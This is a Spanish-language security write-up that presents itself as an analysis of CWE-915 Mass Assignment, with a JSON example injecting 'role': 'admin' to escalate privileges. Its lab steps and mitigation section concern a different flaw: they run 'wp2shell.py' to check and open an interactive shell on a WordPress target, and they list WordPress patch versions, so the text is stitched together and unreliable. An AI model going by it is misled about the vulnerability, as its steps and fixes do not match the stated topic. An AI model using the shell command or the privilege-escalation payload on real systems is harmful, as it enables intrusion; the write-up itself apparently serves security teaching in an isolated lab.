---
layout: writeup
title: "cwe-915 — Mass Assignment Attack"
date: 2008-09-21
category: "CWE · WEB"
description: "Análisis y demostración de una vulnerabilidad de Mass Assignment, clasificada como CWE-915, que permite modificar atributos internos de objetos mediante parámetros controlados por el atacante cuando la aplicación no restringe adecuadamente las propiedades que pueden ser actualizadas."
image: "/writeups/cwe-915/portada.jpg"
---
 
## Resumen
 
El presente análisis evalúa una vulnerabilidad de Mass Assignment, clasificada por MITRE como CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes ('Mass Assignment'). La debilidad consiste en permitir que atributos proporcionados por el usuario sean utilizados directamente para inicializar o modificar objetos internos sin controlar adecuadamente cuáles propiedades pueden ser modificadas.

El concepto de Mass Assignment en aplicaciones Ruby on Rails se encuentra documentado desde 2008, incluyendo una referencia histórica de Michael Hartl fechada el 21 de septiembre de 2008, posteriormente incorporada por MITRE como referencia para CWE-915.

Posteriormente, en marzo de 2012, la vulnerabilidad adquirió especial notoriedad tras la demostración pública realizada por Egor Homakov contra GitHub, donde se aprovechó el comportamiento de Mass Assignment de Ruby on Rails para modificar atributos que no deberían haber estado bajo control del usuario.

Durante la explotación, un atacante puede identificar propiedades sensibles como role, isAdmin, permissions, user_id o similares e incluirlas dentro de una solicitud HTTP legítima. Si el servidor realiza una asignación automática de los parámetros recibidos, dichas propiedades pueden ser modificadas sin la autorización correspondiente.

Dependiendo de los atributos expuestos, la explotación puede provocar modificación no autorizada de información, escalada de privilegios, modificación de permisos o acceso a funcionalidades administrativas.

## Descripcion

Mass Assignment ocurre cuando una aplicación acepta múltiples atributos enviados por el cliente y los asigna automáticamente a un objeto interno sin restringir adecuadamente las propiedades que pueden ser modificadas.

Por ejemplo, una aplicación puede permitir que un usuario modifique legítimamente su nombre:

```
{
  "name": "Usuario"
}
```

Sin embargo, un atacante podría intentar agregar un atributo privilegiado:

```
{
  "name": "Usuario",
  "role": "admin"
}
```

Si el backend asigna automáticamente todos los parámetros recibidos y no verifica que el usuario esté autorizado para modificar role, podría producirse una escalada de privilegios.

MITRE define CWE-915 precisamente como la modificación incorrectamente controlada de atributos determinados dinámicamente.

## Entorno
 
- Aplicación/servicio: Aplicación web vulnerable utilizada para reproducir un escenario de Mass Assignment.
- Sistema: [Descarga el lab](https://bblabs.es/recursos/laboratorio-asi-los-hackers-consiguen-premium-gratis).
- Infraestructura: Laboratorio local aislado destinado exclusivamente a pruebas de seguridad.
- Alcance: Las pruebas se limitaron exclusivamente en una máquina virtual controlada por el evaluador.
 
## Paso 1: Check
 
Podemos validar si nuestro objetivo es vulnerable con el comando:

```
python3 wp2shell.py check http://192.168.209.156:8080
```

## Paso 2: Explotacion
 
Una vez vemos que la victima es vulnerable enviamos el ataque con el siguiente comando:

```
python3 wp2shell.py shell http://192.168.209.156:8080 -i
```
 
![Captura del análisis]({{ '/writeups/cve-2026-63030/01-wp2shell.png' | relative_url }})
 
## Maquina de lab

- [Descarga laboratorio](https://bblabs.es/recursos/laboratorio-asi-los-hackers-consiguen-premium-gratis)



## Mitigación y aprendizajes
 
### Corrección Técnica y Parche del Fabricante

La resolución de esta cadena de vulnerabilidades requiere la actualización del núcleo de WordPress. El equipo de seguridad del CMS corrigió el fallo de lógica en el enrutamiento de la API REST Batch y saneó la propiedad de consulta de posts. Las versiones oficiales parches y seguras son:

- Rama 7.0.x: Actualizar a WordPress 7.0.2
- Rama 6.9.x: Actualizar a WordPress 6.9.5
- Rama 6.8.x: Actualizar a WordPress 6.8.6 (corrige el componente de inyección SQL)

### Medidas Defensivas y de Contención

En escenarios donde la actualización inmediata no sea viable debido a ventanas de mantenimiento o pruebas de compatibilidad, se deben aplicar las siguientes medidas de mitigación temporal:

• Reglas de Firewall de Aplicación Web (WAF): Configurar firmas específicas para bloquear o inspeccionar de forma estricta cualquier solicitud entrante hacia los endpoints /wp-json/batch/v1 y /?rest_route=/batch/v1 que no provenga de un origen de confianza o una sesión administrativa legítima.
• Restricción vía Código: Implementar un plugin de control interno o modificar el archivo functions.php para interceptar y rechazar peticiones anónimas que intenten invocar el procesamiento por lotes de la API REST.
• Auditoría de Integridad: Monitorear de forma continua la creación de archivos PHP sospechosos en el directorio wp-content/ y verificar periódicamente que no existan cuentas con privilegios de administrador que no hayan sido creadas por el equipo de TI.
 
## Referencias
 
- [Exploit](https://github.com/Icex0/wp2shell-poc)
- [Rapid7 Blog — CVE-2026-63030: WP2Shell](https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core/)
- [Elastic Security Labs — WP2Shell Detection](https://www.elastic.co/security-labs/blog/wp2shell-wordpress-rce-detection-elastic-defend)
- [F5 Labs — CVE-2026-63030 and CVE-2026-60137](https://www.f5.com/labs/articles/cve-2026-63030-and-cve-2026-60137-wp2shell-captured-exploit-payload)
